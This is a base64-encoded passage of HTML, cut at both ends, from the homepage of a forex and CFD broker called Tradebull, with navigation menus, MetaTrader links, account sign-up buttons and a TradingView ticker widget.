ZT4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIj4KCTxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSIiPgoJPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IiI+CgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4KCTxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgbWF4aW11bS1zY2FsZT0xIj4KCTwhLS1GYXZpY29uLS0+Cgk8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgaHJlZj0iL2Fzc2V0cy9pbWcvcm9vdC9mYXZpY29uLnBuZyI+Cgk8IS0tRnJhbWV3b3JrLS0+Cgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9hc3NldHMvY3NzL2ZyYW1ld29yay9ib290c3RyYXAubWluLmNzcyI+Cgk8IS0tRm9udHMtLT4KCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL2Fzc2V0cy9mb250cy9JbnRlci9zdHlsZS5jc3MiPgoJPCEtLVBsdWdpbnMtLT4KCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL2Fzc2V0cy9jc3Mvdmx0LXBsdWdpbnMubWluLmNzcyI+Cgk8IS0tU3R5bGUtLT4KCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL2Fzc2V0cy9jc3Mvdmx0LW1haW4ubWluLmNzcyI+Cgk8IS0tQ3VzdG9tLS0+Cgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9hc3NldHMvY3NzL2N1c3RvbS5jc3MiPgoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvYXNzZXRzL2Nzcy9yZXNwb25zaXZlLmNzcyI+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9wcm8uZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjEwLjAvY3NzL2FsbC5jc3MiIGludGVncml0eT0ic2hhMzg0LUFZbUVDM1l3NWNWYjNaY3VIdE9BOTN3MzVkWVRzdmhMUFZuWXM5ZVN0SGZHSnZPdkt4VmZFTEdyb0drdnNnK3AiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiLz4KCgo8L2hlYWQ+Cgo8Ym9keSBjbGFzcz0iYW5pbXNpdGlvbiI+Cgk8IS0tSGVhZGVyLS0+Cgk8aGVhZGVyIGNsYXNzPSJ2bHQtaGVhZGVyIj4KCQk8ZGl2IGNsYXNzPSJ2bHQtbmF2YmFyIHZsdC1uYXZiYXItLW1haW4gdmx0LW5hdmJhci0tZml4ZWQgbGlnaHQtaGVhZCI+CgkJCTxkaXYgY2xhc3M9InZsdC1uYXZiYXItYmFja2dyb3VuZCI+PC9kaXY+CgkJCTxkaXYgY2xhc3M9InZsdC1uYXZiYXItaW5uZXIiPgoJCQkJPGRpdiBjbGFzcz0idmx0LW5hdmJhci1pbm5lci0tbGVmdCI+CgkJCQkJPCEtLUxvZ28tLT48YSBjbGFzcz0idmx0LW5hdmJhci1sb2dvIiBocmVmPSIjSG9tZSI+PGltZyBjbGFzcz0iYmxhY2siIHNyYz0iL2Fzc2V0cy9pbWcvcm9vdC9sb2dvLWJsYWNrLnBuZyIgYWx0PSJpbWciPjxpbWcgY2xhc3M9IndoaXRlIiBzcmM9Ii9hc3NldHMvaW1nL3Jvb3QvbG9nby13aGl0ZS5wbmciIGFsdD0iaW1nIj48L2E+CgkJCQkJPCEtLUNvbnRhY3RzLS0+CgkJCQkJPG5hdiBjbGFzcz0idmx0LW5hdmJhci1jb250YWN0cyBkLW5vbmUgZC1tZC1ibG9jayI+CgkJCQkJCTx1bD4KCQkJCQkJCTxsaT48YSBocmVmPSJodHRwczovL3RyYWRlYnVsbC5pbyI+SE9NRTwvYT48L2xpPgoJCQkJCQkJPGxpPgoJCQkJCQkJCTxsYWJlbCBmb3I9ImRyb3AtMSIgY2xhc3M9InRvZ2dsZSIgIGlkPSJjbGlja21lIj4gU0VSVklDRVM8L2xhYmVsPgoJCQkJCQkJCTxhIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKTsiPiBTRVJWSUNFUyAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMjRweCIgdmlld0JveD0iMCAwIDI0IDI0IiB3aWR0aD0iMjRweCIgZmlsbD0iI2ZmZmZmZiI+PHBhdGggZD0iTTAgMGgyNHYyNEgwVjB6IiBmaWxsPSJub25lIi8+PHBhdGggZD0iTTcgMTBsNSA1IDUtNUg3eiIvPjwvc3ZnPjwvYT4KCQkJCQkJCQk8aW5wdXQgdHlwZT0iY2hlY2tib3giIGlkPSJkcm9wLTEiLz4KCQkJCQkJCQk8dWw+CgkJCQkJCQkJCTxsaT4gPGEgaHJlZj0iL3JvbGxvdmVyIj4gUk9MTE9WRVJTIDwvYT48L2xpPgoJCQkJCQkJCQk8bGk+IDxhIGhyZWY9Ii9wcmljaW5nIj4gTElWRSBQUklDSU5HIDwvYT4gPC9saT4KCQkJCQkJCQkJPGxpPiA8YSBocmVmPSIvZXhlY3V0aW9uIj5FWEVDVVRJT04gU0NPUkVCT0FSRCA8L2E+PC9saT4KCQkJCQkJCQk8L3VsPjwvbGk+CgkJCQkJCQk8bGk+PGEgaHJlZj0iL2Fib3V0Ij5BQk9VVDwvYT48L2xpPgoJCQkJCQkJPGxpPgoJCQkJCQkJCTxsYWJlbCBmb3I9ImRyb3AtMSIgY2xhc3M9InRvZ2dsZSIgIGlkPSJjbGlja21lIj4gUExBVEZPUk1TPC9sYWJlbD4KCQkJCQkJCQk8YSBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCk7Ij4gUExBVEZPUk1TICA8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNHB4IiBmaWxsPSIjZmZmZmZmIj48cGF0aCBkPSJNMCAwaDI0djI0SDBWMHoiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNNyAxMGw1IDUgNS01SDd6Ii8+PC9zdmc+PC9hPgoJCQkJCQkJCTxpbnB1dCB0eXBlPSJjaGVja2JveCIgaWQ9ImRyb3AtMSIvPgoJCQkJCQkJCTx1bD4KCQkJCQkJCQkJPGxpPiA8YSBocmVmPSIvcGxhdGZvcm1zIj5NZXRhVHJhZGVyIDUgIDwvYT48L2xpPgoJCQkJCQkJCQk8bGk+IDxhIGhyZWY9Im1ldGEtdHJhZGVyLW1vYmlsZS5waHAiPk1ldGFUcmFkZXIgTW9iaWxlICA8L2E+PC9saT4KCQkJCQkJCQkJPGxpPiA8YSBocmVmPSIiPk1ldGFUcmFkZXIgV2ViICA8L2E+IDwvbGk+CgkJCQkJCQkJCTxsaT4gPGEgaHJlZj0iL2Rvd25sb2FkIj5Eb3dubG9hZHM8L2E+PC9saT4KCQkJCQkJCQk8L3VsPgoJCQkJCQkJPC9saT4gCgkJCQkJCQk8bGk+IDxhIGhyZWY9Ii9lZHVjYXRpb24iPkVEVUNBVElPTiA8L2E+PC9saT4KCQkJCQkJCTxsaT4gPGEgaHJlZj0iL2Jsb2dzIj5CbG9ncyA8L2E+PC9saT4KCQkJCQkJCTxsaT48YSBocmVmPSIvY29udGFjdCI+Q09OVEFDVDwvYT48L2xpPgoJCQkJCQkJPGxpIGNsYXNzPSJzZXAiPiZuYnNwOyZuYnNwOzwvbGk+PGxpIGNsYXNzPSJzZXAiPiZuYnNwOyZuYnNwOzwvbGk+CgkJCQkJCQk8bGk+PGEgY2xhc3M9InZsdC1sb2dpbiIgaHJlZj0iaHR0cHM6Ly9jbGllbnQudHJhZGVidWxsLmlvLyI+PGltZyBjbGFzcz0iYmxhY2siIHNyYz0iL2Fzc2V0cy9pbWcvcm9vdC9sb2dpbi1ibGFjay5wbmciIGFsdD0iIj48aW1nIGNsYXNzPSJ3aGl0ZSIgc3JjPSIvYXNzZXRzL2ltZy9yb290L2xvZ2luLXdoaXRlLnBuZyIgYWx0PSJpbWciPkxvZ2luPC9hPjwvbGk+CgkJCQkJCTwvdWw+CgkJCQkJPC9uYXY+CgkJCQk8L2Rpdj4KCQkJCTxkaXYgY2xhc3M9InZsdC1uYXZiYXItaW5uZXItLXJpZ2h0Ij4KCQkJCQk8ZGl2IGNsYXNzPSJkLWZsZXggYWxpZ24taXRlbXMtY2VudGVyIj4KCQkJCQkJPCEtLU1lbnUgQnVyZ2VyLS0+PGEgY2xhc3M9InZsdC1tZW51LWJ1cmdlciBqcy1vZmZjYW52YXMtbWVudS1vcGVuIiBpZD0idmx0LW1lbnUtYnVyZ2VyIiBocmVmPSIjIj48c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iY3VycmVudENvbG9yIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPgoJCQkJCQkJCTxsaW5lIHgxPSIzIiB5MT0iMTIiIHgyPSIyMSIgeTI9IjEyIiAvPgoJCQkJCQkJCTxsaW5lIHgxPSIzIiB5MT0iNiIgeDI9IjIxIiB5Mj0iNiIgLz4KCQkJCQkJCQk8bGluZSB4MT0iMyIgeTE9IjE4IiB4Mj0iMjEiIHkyPSIxOCIgLz48L3N2Zz48L2E+CgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgoJCQoKCTwvaGVhZGVyPgoJPCEtLU9mZmNhbnZhcyBNZW51LS0+Cgk8IS0tT2ZmY2FudmFzIE1lbnUtLT4KCTxkaXYgY2xhc3M9InZsdC1vZmZjYW52YXMtbWVudSAiPgoJCTxzcGFuIGlkPSdjbG9zZSc+eDwvc3Bhbj4KCQk8bmF2IGNsYXNzPSJ2bHQtb2ZmY2FudmFzLW1lbnVfX25hdmlnYXRpb24iPgoJCQk8IS0tTmF2aWdhdGlvbi0tPgoJCQk8dWwgY2xhc3M9InNmLW1lbnUiPgoJCQkJPGxpPjxhIGhyZWY9Imh0dHBzOi8vdHJhZGVidWxsLmlvIj5IT01FPC9hPjwvbGk+CgkJCQk8bGk+CgkJCQkJPGxhYmVsIGZvcj0iZHJvcC0xIiBjbGFzcz0idG9nZ2xlIiAgaWQ9ImNsaWNrbWUiPiBTRVJWSUNFUzwvbGFiZWw+CgkJCQkJPGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApOyI+IFNFUlZJQ0VTICA8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNHB4IiBmaWxsPSIjZmZmZmZmIj48cGF0aCBkPSJNMCAwaDI0djI0SDBWMHoiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNNyAxMGw1IDUgNS01SDd6Ii8+PC9zdmc+PC9hPgoJCQkJCTxpbnB1dCB0eXBlPSJjaGVja2JveCIgaWQ9ImRyb3AtMSIvPgoJCQkJCTx1bD4KCQkJCQkJPGxpPiA8YSBocmVmPSIvcm9sbG92ZXIiPiBST0xMT1ZFUlMgPC9hPjwvbGk+CgkJCQkJCTxsaT4gPGEgaHJlZj0iL3ByaWNpbmciPiBMSVZFIFBSSUNJTkcgPC9hPiA8L2xpPgoJCQkJCQk8bGk+IDxhIGhyZWY9Ii9leGVjdXRpb24iPkVYRUNVVElPTiBTQ09SRUJPQVJEIDwvYT48L2xpPgoJCQkJCTwvdWw+CgkJCQk8L2xpPgoJCQkJCgkJCQk8bGk+PGEgaHJlZj0iL2Fib3V0IiA+QUJPVVQ8L2E+PC9saT4gCgkJCQkKCQkJCTxsaT4KCQkJCQk8bGFiZWwgZm9yPSJkcm9wLTEiIGNsYXNzPSJ0b2dnbGUiICBpZD0iY2xpY2ttZSI+IFBMQVRGT1JNUzwvbGFiZWw+CgkJCQkJPGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApOyI+IFBMQVRGT1JNUyAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMjRweCIgdmlld0JveD0iMCAwIDI0IDI0IiB3aWR0aD0iMjRweCIgZmlsbD0iI2ZmZmZmZiI+PHBhdGggZD0iTTAgMGgyNHYyNEgwVjB6IiBmaWxsPSJub25lIi8+PHBhdGggZD0iTTcgMTBsNSA1IDUtNUg3eiIvPjwvc3ZnPjwvYT4KCQkJCQk8aW5wdXQgdHlwZT0iY2hlY2tib3giIGlkPSJkcm9wLTEiLz4KCQkJCQk8dWw+CgkJCQkJCTx1bD4KCQkJCQkJCTxsaT4gPGEgaHJlZj0iL3BsYXRmb3JtcyI+TWV0YVRyYWRlciA1ICA8L2E+PC9saT4KCQkJCQkJCTxsaT4gPGEgaHJlZj0iL21ldGEtdHJhZGVyLW1vYmlsZSI+TWV0YVRyYWRlciBNb2JpbGUgIDwvYT48L2xpPgoJCQkJCQkJPGxpPiA8YSBocmVmPSIiPk1ldGFUcmFkZXIgV2ViICA8L2E+IDwvbGk+CgkJCQkJCTwvdWw+CgkJCQkJPC91bD4KCQkJCTwvbGk+CgkJCQk8bGk+IDxhIGhyZWY9Ii9lZHVjYXRpb24iPkVEVUNBVElPTiA8L2E+PC9saT4KCQkJCTxsaT4gPGEgaHJlZj0iL2Jsb2dzIj5CbG9ncyA8L2E+PC9saT4KCQkJCTxsaT48YSBocmVmPSIvY29udGFjdCI+Q09OVEFDVDwvYT48L2xpPgoJCQkJPGxpPjxhIGhyZWY9Imh0dHBzOi8vY2xpZW50LnRyYWRlYnVsbC5pby8iPkxvZ2luPC9hPjwvbGk+CgkJCTwvdWw+CgkJPC9uYXY+Cgk8L2Rpdj4KCQoJPCEtLVNpdGUgT3ZlcmxheS0tPgoJPGRpdiBjbGFzcz0idmx0LXNpdGUtb3ZlcmxheSI+PC9kaXY+Cgk8IS0tRml4ZWQgU29jaWFscy0tPgoJCgk8IS0tTWFpbi0tPgoJPG1haW4gY2xhc3M9InZsdC1tYWluIj4KCQk8IS0tRnVsbHBhZ2UgU2xpZGVyLS0+CgkJPGRpdiBjbGFzcz0idmx0LWZ1bGxwYWdlLXNsaWRlciIgZGF0YS1sb29wLXRvcD0iIiBkYXRhLWxvb3AtYm90dG9tPSIiIGRhdGEtc3BlZWQ9IjgwMCI+CgkJCTwhLS1Ib21lLS0+CgkJCTwhLS1TZWN0aW9uLS0+CgkJCTxkaXYgY2xhc3M9InZsdC1zZWN0aW9uIHBwLXNjcm9sbGFibGUiIGRhdGEtYW5jaG9yPSJIb21lIiBkYXRhLWJyaWdodG5lc3M9ImRhcmsiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQodG8gcmlnaHQgdG9wLCByZ2IoNywgNTYsIDE1NyksIHJnYig1LCA2NSwgMTg1KSwgcmdiKDE0LCA3MywgMTg1KSwgcmdiKDM3LCAxMDYsIDIyNiksIHJnYig0MSwgMTE4LCAyNDQpKTsgdHJhbnNmb3JtOiB0cmFuc2xhdGUzZCgwcHgsIDBweCwgMHB4KTsiPgoJCQkJPGRpdiBjbGFzcz0idmx0LXNlY3Rpb25fX3ZlcnRpY2FsLWFsaWduIj4KCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtc2VjdGlvbl9fY29udGVudCI+CgkJCQkJCTwhLS1QYXJ0aWNsZXMtLT4KCQkJCQkJPGRpdiBjbGFzcz0idmx0LXNlY3Rpb25fX3BhcnRpY2xlcyI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtcGFydGljbGUgdmx0LWZhZGUtaW4tbGVmdCB2bHQtY3VzdG9tLS0xNDUxIiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKC9hc3NldHMvaW1nL3Jvb3QvcGx1cy1kYXJrLXBhdHRlcm4ucG5nKTsgdHJhbnNpdGlvbi1kdXJhdGlvbjogMXM7Ij48L2Rpdj4KCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1wYXJ0aWNsZSBkLW5vbmUgZC14bC1ibG9jayB2bHQtZmFkZS1pbi1yaWdodCB2bHQtY3VzdG9tLS0xNTEyIiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKC9hc3NldHMvaW1nL3Jvb3QvZWxpcHNlLWhvbWUtc2xpZGUucG5nKTsgdHJhbnNpdGlvbi1kdXJhdGlvbjogMS41czsgdHJhbnNpdGlvbi1kZWxheTogMzAwbXM7Ij48L2Rpdj4KCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1wYXJ0aWNsZSB2bHQtY3VzdG9tLS00MTI0IGhvbWUtaW1nIiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKC9hc3NldHMvaW1nL3RyYWRlLnBuZyk7Ij48L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCQkJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJyb3ciPgoJCQkJCQkJCTxkaXYgY2xhc3M9ImNvbC1sZy04Ij4KCQkJCQkJCQkJPCEtLUFuaW1hdGVkIEJsb2NrLS0+CgkJCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1hbmltYXRlZC1ibG9jayBiYW5lciIgc3R5bGU9ImFuaW1hdGlvbi1kZWxheTowczsgYW5pbWF0aW9uLWR1cmF0aW9uOjcwMG1zOyI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtZ2FwLTEwIj48L2Rpdj4KCQkJCQkJCQkJCTxoMSBjbGFzcz0idmx0LWxhcmdlLWhlYWRpbmcgaGFzLXdoaXRlLWNvbG9yIj5UUkFERSBXSVRIIFRSVVNUIDxicj4gVFJBREUgV0lUSCBVUy48L2gxPgoJCQkJCQkJCQkJPHAgY2xhc3M9InZsdC1kaXNwbGF5LTEgaGFzLXdoaXRlLWNvbG9yIj5Gb3JleCwgQ0ZEcyBvbiBTaGFyZXMsIEZ1dHVyZXMsIEluZGljZXMsIE1ldGFscyAmIEVuZXJnaWVzPC9wPgoJCQkJCQkJCQkJPGRpdiBjbGFzcz0idmx0LWdhcC00MCI+PC9kaXY+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJyb3ciPgoJCQkJCQkJCQkJCTxkaXYgY2xhc3M9ImNvbC1hdXRvIj4KCQkJCQkJCQkJCQkJPCEtLUNvdW50ZXIgVXAgU21hbGwtLT4KCQkJCQkJCQkJCQkJPGRpdiBjbGFzcz0idmx0LWNvdW50ZXItdXAtc21hbGwgYmx1ZS1idG4iIGRhdGEtZW5kaW5nLW51bWJlcj0iMTIiIGRhdGEtYW5pbWF0aW9uLXNwZWVkPSIxMDAwIiBkYXRhLWRlbGltaXRlcj0iIj4KCQkJCQkJCQkJCQkJCTxhIGNsYXNzPSJoYXMtd2hpdGUtY29sb3IiIGhyZWY9Imh0dHBzOi8vY2xpZW50LnRyYWRlYnVsbC5pby8iPk9QRU4gQSBERU1PIEFDQ09VTlQ8L2E+CgkJCQkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtZ2FwLTIwLS1zbSI+PC9kaXY+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQkJPGRpdiBjbGFzcz0iY29sLWF1dG8iPgoJCQkJCQkJCQkJCQk8IS0tQ291bnRlciBVcCBTbWFsbC0tPgoJCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtY291bnRlci11cC1zbWFsbCBvcmFuZ2UtYnRuIiBkYXRhLWVuZGluZy1udW1iZXI9IjE4IiBkYXRhLWFuaW1hdGlvbi1zcGVlZD0iMTAwMCIgZGF0YS1kZWxpbWl0ZXI9IiI+CgkJCQkJCQkJCQkJCQk8YSBjbGFzcz0iaGFzLXdoaXRlLWNvbG9yIiBocmVmPSJodHRwczovL2NsaWVudC50cmFkZWJ1bGwuaW8vIj5PUEVOIEFOIEFDQ09VTlQ8L2E+CgkJCQkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCTwvZGl2PgoJCQkJCQkJPC9kaXY+CgkJCQkJCTwvZGl2PgoJCQkJCQkKCQkJCQk8L2Rpdj4KCQkJCQk8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOiNmNGY0ZjQ7IiBjbGFzcz0ic3BhcmVkIj4KCQkJCQkJCTxkaXYgY2xhc3M9IndvdyBmYWRlSW5VcCAgYW5pbWF0ZWQiIGRhdGEtd293LWRlbGF5PSIxcyIgZGF0YS13b3ctZHVyYXRpb249IjFzIiBzdHlsZT0idmlzaWJpbGl0eTogdmlzaWJsZTsgYW5pbWF0aW9uLWR1cmF0aW9uOiAxczsgYW5pbWF0aW9uLWRlbGF5OiAxczsgYW5pbWF0aW9uLW5hbWU6IGZhZGVJblVwOyI+CgkJCQkJCQkJPGRpdiBjbGFzcz0iIj4KCQkJCQkJCQkJPCEtLSBUcmFkaW5nVmlldyBXaWRnZXQgQkVHSU4gLS0+CgkJCQkJCQkJCTxkaXYgY2xhc3M9InRyYWRpbmd2aWV3LXdpZGdldC1jb250YWluZXIiIHN0eWxlPSJ3aWR0aDogMTAwJTsgaGVpZ2h0OiA0NHB4OyI+CgkJCQkJCQkJCQk8aWZyYW1lIHNjcm9sbGluZz0ibm8iIGFsbG93dHJhbnNwYXJlbmN5PSJ0cnVlIiBmcmFtZWJvcmRlcj0iMCIgc3JjPSJodHRwczovL3MudHJhZGluZ3ZpZXcuY29tL2VtYmVkLXdpZGdldC90aWNrZXItdGFwZS8/bG9jYWxlPWVuIyU3QiUyMnN5bWJvbHMlMjIlM0ElNUIlN0IlMjJ0aXRsZSUyMiUzQSUyMlMlMjZQJTIwNTAwJTIyJTJDJTIycHJvTmFtZSUyMiUzQSUyMk9BTkRBJTNBU1BYNTAwVVNEJTIyJTdEJTJDJTdCJTIydGl0bGUlMjIlM0ElMjJOYXNkYXElMjAxMDAlMjIlMkMlMjJwcm9OYW1lJTIyJTNBJTIyT0FOREElM0FOQVMxMDBVU0QlMjIlN0QlMkMlN0IlMjJ0aXRsZSUyMiUzQSUyMkVVUiUyRlVTRCUyMiUyQyUyMnByb05hbWUlMjIlM0ElMjJGWF9JREMlM0FFVVJVU0QlMjIlN0QlMkMlN0IlMjJ0aXRsZSUyMiUzQSUyMkJUQyUyRlVTRCUyMiUyQyUyMnByb05hbWUlMjIlM0ElMjJCSVRTVEFNUCUzQUJUQ1VTRCUyMiU3RCUyQyU3QiUyMnRpdGxlJTIyJTNBJTIyRVRIJTJGVVNEJTIyJTJDJTIycHJvTmFtZSUyMiUzQSUyMkJJVFNUQU1QJTNBRVRIVVNEJTIyJTdEJTVEJTJDJTIyY29sb3JUaGVtZSUyMiUzQSUyMmxpZ2h0JTIyJTJDJTIyaXNUcmFuc3BhcmVudCUyMiUzQXRydWUlMkMlMjJsYXJnZUNoYXJ0VXJsJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZ0cmFkZWJ1bGxmeC5jb20lMkYlMjIlMkMlMjJkaXNwbGF5TW9kZSUyMiUzQSUyMmFkYXB0aXZlJTIyJTJDJTIyd2lkdGglMjIlM0ElMjIxMDAlMjUlMjIlMkMlMjJoZWlnaHQlMjIlM0E0NCUyQyUyMnV0bV9zb3VyY2UlMjIlM0ElMjJ3d3cudHJhZGVidWxsZnguY29tJTIyJTJDJTIydXRtX21lZGl1bSUyMiUzQSUyMndpZGdldCUyMiUyQyUyMnV0bV9jYW1wYWlnbiUyMiUzQSUyMnRpY2tlci10YXBlJTIyJTdEIiBzdHlsZT0iYm94LXNpemluZzogYm9yZGVyLWJveDsgaGVpZ2h0OiA0NHB4OyB3aWR0aDogMTAwJTsiPjwvaWZyYW1lPgoJCQkJCQkJCQkJCgkJCQkJCQkJICAgPC9kaXY+CgkJCQkJCQkJCTwhLS0gVHJhZGluZ1ZpZXcgV2lkZ2V0IEVORCAtLT4KCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCTwvZGl2PgoJCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQkJPCEtLVNlcnZpY2VzLS0+CgkJCTwhLS1TZWN0aW9uLS0+CgkJCTxkaXYgY2xhc3M9InZsdC1zZWN0aW9uIHBwLXNjcm9sbGFibGUiIGRhdGEtYW5jaG9yPSJTZXJ2aWNlcyIgZGF0YS1icmlnaHRuZXNzPSJsaWdodCI+CgkJCQk8ZGl2IGNsYXNzPSJ2bHQtc2VjdGlvbl9fdmVydGljYWwtYWxpZ24iPgoJCQkJCTxkaXYgY2xhc3M9InZsdC1zZWN0aW9uX19jb250ZW50Ij4KCQkJCQkJPCEtLVBhcnRpY2xlcy0tPgoJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtc2VjdGlvbl9fcGFydGljbGVzIj4KCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1wYXJ0aWNsZSB2bHQtY3VzdG9tLS0xMjU5IHZsdC1mYWRlLWluLXJpZ2h0IiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKC9hc3NldHMvaW1nL3Jvb3QvcGx1cy1saWdodC1wYXR0ZXJuLnBuZyk7IGFuaW1hdGlvbi1kZWxheTogNzUwbXM7Ij48L2Rpdj4KCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1wYXJ0aWNsZSB2bHQtY3VzdG9tLS0yMzU1IHZsdC1mYWRlLWluLWxlZnQiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoL2Fzc2V0cy9pbWcvcm9vdC9lbGlwc2UtbGlnaHQucG5nKTsgYW5pbWF0aW9uLWRlbGF5OiA1MDBtczsiPjwvZGl2PgoJCQkJCQk8L2Rpdj4KCQkJCQkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCQkJCTxkaXYgY2xhc3M9InJvdyI+CgkJCQkJCQkJPGRpdiBjbGFzcz0iY29sLWxnLTMgZC1ub25lIGQtbGctYmxvY2siPgoJCQkJCQkJCQk8IS0tQW5pbWF0ZWQgQmxvY2stLT4KCQkJCQkJCQkJPGRpdiBjbGFzcz0idmx0LWFuaW1hdGVkLWJsb2NrIiBzdHlsZT0iYW5pbWF0aW9uLWRlbGF5OjBzOyBhbmltYXRpb24tZHVyYXRpb246NzAwbXM7Ij4KCQkJCQkJCQkJCTwhLS1Db3VudGVyIFVwLS0+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtY291bnRlci11cCIgZGF0YS1lbmRpbmctbnVtYmVyPSIxMCIgZGF0YS1hbmltYXRpb24tc3BlZWQ9IjUwMCIgZGF0YS1kZWxpbWl0ZXI9IiI+PHNwYW4gY2xhc3M9ImNvdW50ZXIiPjA8L3NwYW4+PHN1cD4rPC9zdXA+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1nYXAtNDAiPjwvZGl2PgoJCQkJCQkJCQkJPGg2PlllYXJzIDxicj5FeHBlcmllbmNlIDxicj5Xb3JraW5nPC9oNj4KCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJPGRpdiBjbGFzcz0iY29sLWxnLTggY29sLW1kLTEyIj4KCQkJCQkJCQkJPCEtLUFuaW1hdGVkIEJsb2NrLS0+CgkJCQkJCQkJCTxkaXYgY2xhc3M9InZsdC1hbmltYXRlZC1ibG9jayIgc3R5bGU9ImFuaW1hdGlvbi1kZWxheToxMDBtczsgYW5pbWF0aW9uLWR1cmF0aW9uOjcwMG1zOyI+CgkJCQkJCQkJCQk8aDIgY2xhc3M9InN1Yi10aXRsZSI+RXhwZXJpZW5jZSBmZWF0dXJlLXJpY2ggcmVsaWFiaWxpdHkgd2l0aDxzcGFuIGNsYXNzPSJoYXMtZmlyc3QtY29sb3IiPiBUcmFkZWJ1bGwgYWNjb3VudC48L3NwYW4+PC9oMj4KCQkJCQkJCQkJCTxwIGNsYXNzPSJtaW4tdGl0bGUiPkEgZGVwZW5kYWJsZSBmaXQgZm9yIGR5bmFtaWMgdHJhZGVycy48L3A+CgkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ2bHQtZ2FwLTcwIj48L2Rpdj4KCQkJCQkJCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCQkJCQkJCTxkaXYgY2xhc3M9ImNvbC1tZC0xMiBjb2wtc20tMTIiPgoJCQkJCQkJCQkJCTxkaXYgY2xhc3M9InRyYWRlLXNlcnZpY2VzIj4KCQkJCQkJCQkJCQkJPGRpdiBjbGFzcz0idmx0LWFuaW1hdGVkLWJsb2NrIiBzdHlsZT0iYW5pbWF0aW9uLWRlbGF5OjIwMG1zOyBhbmltYXRpb24tZHVyYXRpb246NzAwbXM7Ij4KCQkJCQkJCQkJCQkJCTxoMyBjbGFzcz0idmx0LXNl